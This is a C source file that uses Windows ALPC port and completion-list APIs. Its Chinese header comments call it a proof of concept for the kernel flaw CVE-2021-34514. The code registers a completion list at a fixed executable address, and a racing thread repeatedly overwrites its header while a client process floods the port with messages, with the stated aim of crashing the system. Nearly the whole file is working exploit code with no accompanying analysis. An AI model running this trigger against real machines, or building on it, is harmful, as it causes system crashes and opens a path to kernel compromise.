//alpc完成列表机制通信
//部分代码取自https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html
//此代码也是 CVE-2021-34514的poc 如果没有蓝屏可以启动多次并需要检查补丁

#include <windows.h>
#include <stdio.h>
#include <windef.h>
#include <Psapi.h>
#include <winternl.h>
#include"alpc.h"
#include<sddl.h>
#pragma comment(lib, "ntdll")

#pragma warning(disable:4996)

ALPC_DATA_VIEW_ATTR viewAttr;
#define MSG_LEN 0x400

PALPC_MESSAGE_ATTRIBUTES alloc_message_attribute(ULONG ulAttributeFlags) {
	NTSTATUS lSuccess;
	PALPC_MESSAGE_ATTRIBUTES pAttributeBuffer;
	LPVOID lpBuffer;
	SIZE_T lpReqBufSize;
	SIZE_T ulAllocBufSize;

	ulAllocBufSize = AlpcGetHeaderSize(ulAttributeFlags); // this calculates: sizeof(ALPC_MESSAGE_ATTRIBUTES) + size of attribute structures
	lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulAllocBufSize);
	if (GetLastError() != 0) {
		wprintf(L"[-] Failed to allocate memory for ALPC Message attributes.\n");
		return NULL;
	}
	pAttributeBuffer = (PALPC_MESSAGE_ATTRIBUTES)lpBuffer;
	//wprintf(L"[*] Initializing ReceiveMessage Attributes (0x%X)...", ulAttributeFlags);
	lSuccess = AlpcInitializeMessageAttribute(
		ulAttributeFlags,	// attributes
		pAttributeBuffer,	// pointer to attributes structure
		ulAllocBufSize,	// buffer size
		&lpReqBufSize
	);
	if (!NT_SUCCESS(lSuccess)) {
		//wprintf(L"Error: 0x%X\n", lSuccess);
		//pAttributeBuffer->ValidAttributes = ulAttributeFlags;
		return NULL;
	}
	else {
		//wprintf(L"Success.\n");
		return pAttributeBuffer;
	}
}

PSECURITY_DESCRIPTOR create_sd_from_string(LPCWSTR szDACL) {
	PSECURITY_DESCRIPTOR pSD;
	ULONG ulSDSize = 0;
	BOOL success = ConvertStringSecurityDescriptorToSecurityDescriptor(
		szDACL,
		SDDL_REVISION_1,
		&pSD,
		&ulSDSize
	);
	return pSD;
}

PPORT_MESSAGE CreateMsgMem(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)
{
	PPORT_MESSAGE lpMem = (PPORT_MESSAGE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + sizeof(PORT_MESSAGE));
	memmove(lpMem, PortMessage, sizeof(PORT_MESSAGE));
	memmove((BYTE*)lpMem + sizeof(PORT_MESSAGE), Message, MessageSize);
	return(lpMem);
}

ULONG adder;

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			printf(" ");
			if ((i + 1) % 16 == 0) {
				printf("|  %s \n", ascii);
			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}


PALPC_MESSAGE_ATTRIBUTES setup_sample_message_attributes(HANDLE hAlpcPort, HANDLE hSection, ULONG ulMessageAttributes) {
	NTSTATUS lSuccess;
	INT iNextMsgAttrBufferOffset;
	SIZE_T ulReqBufSize;
	SIZE_T ulMessageAttributeBufSize = AlpcGetHeaderSize(ulMessageAttributes);
	LPVOID lpAllocTest = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulMessageAttributeBufSize); // NOTE: This buffer is never freed... for this sample i just don't care for this
	PALPC_MESSAGE_ATTRIBUTES pMsgAttrSend = (PALPC_MESSAGE_ATTRIBUTES)lpAllocTest;

	lSuccess = AlpcInitializeMessageAttribute(
		ulMessageAttributes,			// the MessageAttribute 
		pMsgAttrSend,				// pointer to allocated buffer that is used to holf attributes structures
		ulMessageAttributeBufSize,	// buffer that has been allocated
		&ulReqBufSize				// the size that would be needed (in case of the buffer allocated was too small)
	);
	if (!NT_SUCCESS(lSuccess)) {
		wprintf(L"Error calling AlpcInitializeMessageAttribute: 0x%X\n", lSuccess);
	}
	iNextMsgAttrBufferOffset = 8; // 4 bytes allocated attributes + 4 bytes valid attributes

	if (ulMessageAttributes & ALPC_MESSAGE_SECURITY_ATTRIBUTE) {
		// ALPC_MESSAGE_SECURITY_ATTRIBUTE
		SECURITY_QUALITY_OF_SERVICE SecurityQos;
		ALPC_SECURITY_ATTR securityAttr;
		RtlZeroMemory(&securityAttr, sizeof(securityAttr));
		SecurityQos.ImpersonationLevel = SecurityImpersonation; // SecurityIdentification;
		SecurityQos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
		SecurityQos.EffectiveOnly = 0;
		SecurityQos.Length = sizeof(SecurityQos);
		securityAttr.pQOS = &SecurityQos;
		securityAttr.Flags = 0; // 0x10000;
		lSuccess = NtAlpcCreateSecurityContext(hAlpcPort, 0, &securityAttr);
		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] Error creating security context: 0x%X\n", lSuccess);
		}
		else {
			memmove((PBYTE)pMsgAttrSend + iNextMsgAttrBufferOffset, &securityAttr, sizeof(securityAttr));
			iNextMsgAttrBufferOffset += sizeof(securityAttr);
		}
		//RtlSecureZeroMemory(&securityAttr, sizeof(securityAttr));
		/*securityAttr.ContextHandle = &securityContext;
		securityAttr.Flags = 0;
		securityAttr.pQOS = &SecurityQos;*/
	}






	if (ulMessageAttributes & ALPC_MESSAGE_VIEW_ATTRIBUTE) {
		// ALPC_MESSAGE_VIEW_ATTRIBUTE
		viewAttr.Flags = 0;	//unknown
		viewAttr.SectionHandle = hSection;
		viewAttr.ViewBase = 0;
		viewAttr.ViewSize = 0x10000;//50;//sizeof(PORT_VIEW);
		lSuccess = NtAlpcCreateSectionView(
			hAlpcPort, //_In_ HANDLE PortHandle,
			0, // _Reserved_ ULONG Flags,
			&viewAttr //_Inout_ PALPC_DATA_VIEW_ATTR ViewAttributes
		);
		if (!NT_SUCCESS(lSuccess))
		{
			printf("[-] NtAlpcCreateSectionView error:%X\n", lSuccess);
			exit(-1);
		}
		else {
			wprintf(L"[+] NtAlpcCreateSectionView Success Size: %x\n", viewAttr.ViewSize);
			wprintf(L"[*] ViewBase: %x\n", viewAttr.ViewBase);
			// Fill section with some sample junk
			// place ALPC_MESSAGE_VIEW_ATTRIBUTE structure
			memmove((PBYTE)pMsgAttrSend + iNextMsgAttrBufferOffset, &viewAttr, sizeof(viewAttr));
		};
		iNextMsgAttrBufferOffset += sizeof(viewAttr);
	}

	if (ulMessageAttributes & ALPC_MESSAGE_HANDLE_ATTRIBUTE) {
		// ALPC_MESSAGE_HANDLE_ATTRIBUTE
		HANDLE hFile = CreateFile(L"C:\\Users\\Public\\testfile.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		ALPC_HANDLE_ATTR handleAttr;
		handleAttr.Handle = hFile;
		handleAttr.ObjectType = 0;
		handleAttr.Flags = 0;
		handleAttr.DesiredAccess = GENERIC_READ;
		memmove((PBYTE)pMsgAttrSend + iNextMsgAttrBufferOffset, &handleAttr, sizeof(handleAttr));
		iNextMsgAttrBufferOffset += sizeof(handleAttr);
	}

	if (ulMessageAttributes & ALPC_MESSAGE_HANDLE_ATTRIBUTE) {
		// ALPC_MESSAGE_DIRECT_ATTRIBUTE
		/// not yet implemented
	}

	if (ulMessageAttributes & ALPC_MESSAGE_WORK_ON_BEHALF_ATTRIBUTE) {
		//ALPC_MESSAGE_WORK_ON_BEHALF_ATTRIBUTE
		/// not yet implemented
	}

	return pMsgAttrSend;
}

HANDLE hConnectionPort = NULL;
HANDLE handle = NULL;
PALPC_MESSAGE_ATTRIBUTES pMsgAttrReceived = NULL;
PORT_MESSAGE     pmReceived = { 0 };

void th() {

	while (true)
	{
		*(USHORT*)(0x304002) = 0xffff;
	}
}
INT main()
{
	//
// DEFINITIONS
//
	NTSTATUS lSuccess;
	HANDLE hCommunicationPort = NULL;
	UNICODE_STRING usAlpcPortName;
	OBJECT_ATTRIBUTES objAttributes;
	ALPC_PORT_ATTRIBUTES PortAttributes;
	SECURITY_QUALITY_OF_SERVICE SecurityQos;

	SIZE_T ulReceivedSize = MSG_LEN;
	PALPC_MESSAGE_ATTRIBUTES pMsgAttrSend;

	LPCWSTR pwsPortName = L"\\RPC Control\\CSALPCPort"; // the name of the ALPC port we're creating
	CS_PORT_CONTEXT portContext;
	UUID uuid;
	BOOL bAttemptImpersonation = TRUE;
	DWORD dwPID = GetCurrentProcessId();
	DWORD dwTID = GetCurrentThreadId();
	LARGE_INTEGER time = { 0 };
	time.HighPart = 0xffffffff;
	pMsgAttrReceived = alloc_message_attribute(ALPC_MESSAGE_ATTRIBUTE_ALL);
	// QOS
	//RtlZeroMemory(&SecurityQos, sizeof(SECURITY_QUALITY_OF_SERVICE));
	//	SecurityQos.ImpersonationLevel = SecurityImpersonation; // SecurityImpersonation; 
	//	SecurityQos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
	SecurityQos.EffectiveOnly = 0;
	//SecurityQos.Length = sizeof(SecurityQos);
	// ALPC Port Attributs
	//PortAttributes.Flags = ALPC_PORTFLG_ALLOW_DUP_OBJECT | ALPC_PORTFLG_ALLOWIMPERSONATION | ALPC_PORTFLG_LRPC_WAKE_POLICY1 | ALPC_PORTFLG_LRPC_WAKE_POLICY2 | ALPC_PORTFLG_LRPC_WAKE_POLICY3; //0xb84a3f0;// ALPC_PORTFLG_ALLOW_DUP_OBJECT | ALPC_PORTFLG_AllowImpersonation | ALPC_PORTFLG_LRPC_WAKE_POLICY1 | ALPC_PORTFLG_LRPC_WAKE_POLICY2 | ALPC_PORTFLG_LRPC_WAKE_POLICY3; // ; //0x8080000;// ALPC_PORFLG_ALLOW_LPC_REQUESTS;// ALPC_PORFLG_ALLOW_LPC_REQUESTS;// | ALPC_PORFLG_SYSTEM_PROCESS;//0x010000 | 0x020000;	// Found '0x3080000' in rpcrt4.dll
	PortAttributes.MaxMessageLength = MSG_LEN; // technically the hard limit for this is 65535, if no constrains you can use AlpcMaxAllowedMessageLength() to set this limit
	PortAttributes.MaxSectionSize = 0xffffffff; // 20000; 
	PortAttributes.MaxViewSize = 0xffffffff; // 20000; // sizeof(PORT_VIEW); 
	PortAttributes.MaxTotalSectionSize = 0xffffffff;// 20000;
	PortAttributes.DupObjectTypes = 0xffffffff;
	PortAttributes.MaxPoolUsage = 0xffffffff; // 0x4000;
	RtlSecureZeroMemory(&SecurityQos, sizeof(SecurityQos));
	PortAttributes.SecurityQos = SecurityQos;


	// 
	// CREATE PORT
	//
	RtlInitUnicodeString(&usAlpcPortName, pwsPortName);	// Initialize Unicode String
	InitializeObjectAttributes(						// set up OBJECT_ATTRIBUTES structure
		&objAttributes,		// the pointer to the OBJECT_ATTRIBUTES structure
		&usAlpcPortName,	// the name the object we want to obtain a handle for
		0,					// no flags, ref.: https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes
		NULL,				// no root directry handle as our port name is a full qualified path
		NULL//pSD				// security descriptor
	);

	handle = OpenEventW(EVENT_ALL_ACCESS, 0, L"Global\\hi");
	//如果没有打开事件成功说明没有创建alpc端口 说明自身是服务端 然后再创建一个客户端进程
	if (!handle) {
		handle = CreateEventW(0, 0, 0, L"Global\\hi");
		wprintf(L"[+] Starting Server. PID: %d | TID: %d\n", dwPID, dwTID);
		lSuccess = NtAlpcCreatePort(
			&hConnectionPort,			// the handle to our port name
			&objAttributes,		// the OBJECT_ATTRIBUTES structure we just initialized
			&PortAttributes //0 				// additional port attributes
		);
		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] Creating ALPC Port '%s'...  Error: 0x%X\n", lSuccess);

			return 1;
		}
		else wprintf(L"[+] Creating ALPC Port '%s' Success \n", pwsPortName);


		LARGE_INTEGER SectionSize = { 0x10000 };
		HANDLE SectionHandle;
		lSuccess = NtCreateSection(&SectionHandle,
			SECTION_ALL_ACCESS,
			NULL,	//backed by the pagefile
			&SectionSize,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL);

		if (!NT_SUCCESS(lSuccess))
		{
			printf("[-] NtCreateSection error:%X\n", lSuccess);
			exit(-1);
		}
		else wprintf(L"[+] ZwCreateSection Success, Section created. Size: %x\n", SectionSize);



		HANDLE hServerSection;
		SIZE_T nServerSectionSize;
		lSuccess = NtAlpcCreatePortSection(
			hConnectionPort, //_In_ HANDLE PortHandle,
			0, //_In_ ULONG Flags,	// 0x40000 found in rpcrt4.dll
			SectionHandle, //_In_opt_ HANDLE SectionHandle,
			0x10000, // _In_ SIZE_T SectionSize,
			&hServerSection, //_Out_ HANDLE AlpcSectionHandle,
			&nServerSectionSize //_Out_ PSIZE_T ActualSectionSize
		);
		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] NtAlpcCreatePortSection Error: 0x%X\n", lSuccess);
			exit(-1);
		}
		else wprintf(L"[+] NtAlpcCreatePortSection Success, Section created. Size: %x\n", nServerSectionSize);

		ALPC_DATA_VIEW_ATTR adva = { 0 };




		adva.Flags = 0;	//unknown
		adva.SectionHandle = hServerSection;
		adva.ViewBase = NULL;
		adva.ViewSize = 0x10000;

		lSuccess = NtAlpcCreateSectionView(hConnectionPort, 0, &adva);
		if (!NT_SUCCESS(lSuccess))
		{
			printf("[-] NtAlpcCreateSectionView error:%X\n", lSuccess);
			exit(-1);
		}
		else
		{
			wprintf(L"[+] NtAlpcCreateSectionView Success Size: %x\n", adva.ViewSize);
			wprintf(L"[*] ViewBase: %x\n", adva.ViewBase);
		}

		//ULONG64 test = (ULONG64)adva.ViewBase;
		PVOID test2 = (PVOID)VirtualAlloc((LPVOID)0x300000, 0x100000,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };
		PALPC_COMPLETION_LIST_HEADER CompletionListHEADER = { 0 };
		CompletionListHEADER = (PALPC_COMPLETION_LIST_HEADER)test2;

		CompletionList.Buffer = CompletionListHEADER;
		CompletionList.Buffer->StartMagic = 0x1000;
		CompletionList.Size = 0x10000;
		//CompletionList.Size必须是足够大的 必须要大于Buffer->DataOffset加上消息总长度 并且要申请这么大内存(刚才调用的VirtualAlloc)
		CompletionList.ConcurrencyCount = 0x100;
		//CompletionList.Buffer->DataOffset不需要设置,它似乎是系统自动分配的
		//NtAlpcSetInformation >> AlpcpInitializeCompletionList
		/*AlpcpInitializeCompletionList(
			Object,
			v32,                                 CompletionListHEADER->StartMagic
			*((unsigned int*)v11 + 2)            CompletionList.Size
			*((unsigned int*)v11 + 3),			 CompletionList.ConcurrencyCount
			*((_DWORD*)v11 + 4),			     CompletionList.AttributeFlags
			v8);*/

			//消息标志不能为空 否则无法触发漏洞代码路径
		CompletionList.AttributeFlags = ALPC_MESSAGE_SECURITY_ATTRIBUTE;

		lSuccess = NtAlpcSetInformation(hConnectionPort, AlpcRegisterCompletionListInformation, &CompletionList, 24);
		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] NtAlpcSetInformation Error: 0x%X\n", lSuccess);
			exit(-1);
		}
		else wprintf(L"[+] NtAlpcSetInformation Success.\n");


		//DumpHex((PVOID)(buf+ CompletionListHEADER->DataOffset), 0x100);


		PROCESS_INFORMATION pi = { 0 };
		STARTUPINFOEXA si = { sizeof(si) };

		char szModule[MAX_PATH];
		GetModuleFileNameA(NULL, szModule, MAX_PATH);

		BOOL success = CreateProcessA(
			NULL,
			(LPSTR)szModule,
			nullptr, nullptr, FALSE,
			EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr,
			(LPSTARTUPINFOA)&si,
			&pi
		);

		DWORD           szInput[MSG_LEN + 1];
		RtlSecureZeroMemory(&pmReceived, sizeof(pmReceived));
		RtlSecureZeroMemory(&szInput, MSG_LEN);

		pmReceived.u1.s1.DataLength = MSG_LEN - 0x28;
		pmReceived.u1.s1.TotalLength = MSG_LEN;
		PPORT_MESSAGE lpMem = CreateMsgMem(&pmReceived, pmReceived.u1.s1.DataLength, &szInput);

		lSuccess = NtAlpcSendWaitReceivePort(
			hConnectionPort,
			NULL,
			NULL,		// SendMessage_
			NULL,		// SendMessageAttributes
			lpMem,	// ReceiveBuffer
			NULL,		// BufferLength
			NULL,//&test,		// ReceiveMessageAttributes
			NULL			// no timeout
		);


		lSuccess = NtAlpcAcceptConnectPort(
			&hCommunicationPort,		// Communication port handle
			hConnectionPort,			// Connection port handle
			NULL,		// connection flags
			NULL,						// no object attributs
			&PortAttributes, //0,		// port attributes
			&portContext,				// port context
			lpMem,	// connection request
			NULL,				// connection message attributes
			1			// accepting the connection
		);
		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] Connect Error: 0x%X\n", lSuccess);
			exit(-1);
		}
		else wprintf(L"[+] Connect Done\n");


		ULONG64 test = (ULONG64)CompletionListHEADER;

		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);
		while (true)
		{

			WaitForSingleObject(handle, INFINITE);
			ResetEvent(handle);
			Sleep(1);
			lSuccess = NtAlpcSendWaitReceivePort(
				hConnectionPort,
				NULL,
				NULL,		// SendMessage_
				NULL,		// SendMessageAttributes
				lpMem,	// ReceiveBuffer
				&ulReceivedSize,		// BufferLength
				pMsgAttrReceived,//&test,		// ReceiveMessageAttributes
				NULL			// no timeout
			);

			adder = CompletionList.Buffer->DataOffset;
			ULONG type = *(ULONG*)(test + CompletionList.Buffer->DataOffset + 4);




			//一般情况下使用lpMem->u2.s2.Type判断消息类型
			//完成列表由于是异步 所以要使用事件通知辅助来通信
			//switch (type)
			//{

			//	//Client disconnects
			//case 0x5:
			//	wprintf(L"[*] Client disconnects\n");
			//	NtAlpcDisconnectPort(hCommunicationPort, 0);
			//	NtAlpcDisconnectPort(hConnectionPort, 0);
			//	break;
			//	//Client sends message
			//case 0x2001:

			//	wprintf(L"[*] CompletionList.Buffer->DataOffset  %x \n", CompletionList.Buffer->DataOffset);

			//	DumpHex((ULONG*)(test + CompletionList.Buffer->DataOffset), 0x50);
			//	wprintf(L"---------------------------------\n");
			//	if (!NT_SUCCESS(lSuccess)) {
			//		wprintf(L"[-] Accept client messages Error: 0x%X\n", lSuccess);
			//		exit(-1);
			//	}
			//	else wprintf(L"[+] Accept client message successfully \n", pwsPortName);

			//	//wprintf(L"[+]%x\n", CompletionList.AttributeFlags);
			//	break;

			//}

		}

	}
	else
	{

		wprintf(L"[+] Starting client. PID: %d | TID: %d\n", dwPID, dwTID);
		DWORD           szInput[MSG_LEN + 1];


		RtlSecureZeroMemory(&pmReceived, sizeof(pmReceived));
		RtlSecureZeroMemory(&szInput, MSG_LEN);
		memset(szInput, 0x41, MSG_LEN);

		pmReceived.u1.s1.DataLength = MSG_LEN - 0x28;
		pmReceived.u1.s1.TotalLength = MSG_LEN;
		PPORT_MESSAGE lpMem = CreateMsgMem(&pmReceived, pmReceived.u1.s1.DataLength, &szInput);
		ALPC_PORT_COMPLETION_LIST_INFORMATION CompletionList = { 0 };



		lSuccess = NtAlpcConnectPort(&hConnectionPort, &usAlpcPortName, 0, &PortAttributes, NULL, NULL, lpMem, NULL, NULL, NULL, NULL);


		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] NtAlpcConnectPort Error: 0x%X.\n", lSuccess);
			exit(-1);

		}
		else {
			wprintf(L"[+] NtAlpcConnectPort Success.\n");
		}


		LARGE_INTEGER SectionSize = { 0x10000 };
		HANDLE SectionHandle;
		lSuccess = NtCreateSection(&SectionHandle,
			SECTION_MAP_READ | SECTION_MAP_WRITE,
			NULL,	//backed by the pagefile
			&SectionSize,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL);

		if (!NT_SUCCESS(lSuccess))
		{
			printf("[-]  ZwCreateSection error:%X\n", lSuccess);
			exit(-1);
		}
		else wprintf(L"[+] ZwCreateSection Success, Section created. Size: %x\n", SectionSize);
		/*PVOID test = (PVOID)VirtualAlloc((LPVOID)0x300000, 0x100000,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);*/

		HANDLE hServerSection;
		SIZE_T nServerSectionSize;
		lSuccess = NtAlpcCreatePortSection(
			hConnectionPort, //_In_ HANDLE PortHandle,
			0, //_In_ ULONG Flags,	// 0x40000 found in rpcrt4.dll
			SectionHandle, //_In_opt_ HANDLE SectionHandle,
			0x10000, // _In_ SIZE_T SectionSize,
			&hServerSection, //_Out_ HANDLE AlpcSectionHandle,
			&nServerSectionSize //_Out_ PSIZE_T ActualSectionSize
		);
		if (!NT_SUCCESS(lSuccess)) {
			wprintf(L"[-] NtAlpcCreatePortSection Error: 0x%X\n", lSuccess);
			exit(-1);
		}
		else wprintf(L"[+] NtAlpcCreatePortSection Success, Section created. Size: %x\n", nServerSectionSize);




		pMsgAttrSend = setup_sample_message_attributes(hConnectionPort, hServerSection, ALPC_MESSAGE_VIEW_ATTRIBUTE); //ALPC_MESSAGE_SECURITY_ATTRIBUTE
		pMsgAttrSend->ValidAttributes |= ALPC_MESSAGE_VIEW_ATTRIBUTE;  // Mark an attribute as valid

		memset(viewAttr.ViewBase, 0x43, MSG_LEN);
		lpMem = (PPORT_MESSAGE)viewAttr.ViewBase;
		memmove(lpMem, &pmReceived, sizeof(PORT_MESSAGE));
		//		DumpHex(viewAttr.ViewBase, 0x50);
				//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);

		while (true)
		{
			SetEvent(handle);
			Sleep(1);
			lSuccess = NtAlpcSendWaitReceivePort(
				hConnectionPort,
				NULL,
				lpMem,		// SendMessage_
				NULL,		// SendMessageAttributes
				NULL,		// receiving message
				NULL,						// receiving message length
				NULL,			// receive message attributes
				NULL					// no timeout
			);
		}
			
		//SetEvent(handle);
		//lSuccess = NtAlpcSendWaitReceivePort(
		//	hConnectionPort,
		//	NULL,
		//	lpMem,		// SendMessage_
		//	NULL,		// SendMessageAttributes
		//	NULL,		// receiving message
		//	NULL,						// receiving message length
		//	NULL,			// receive message attributes
		//	NULL					// no timeout
		//);
		//if (!NT_SUCCESS(lSuccess)) {
		//	wprintf(L"[-] NtAlpcSendWaitReceivePort Error: 0x%X\n", lSuccess);
		//	exit(-1);

		//}
		//else wprintf(L"[+] NtAlpcSendWaitReceivePort Success \n", pwsPortName);


	}


}
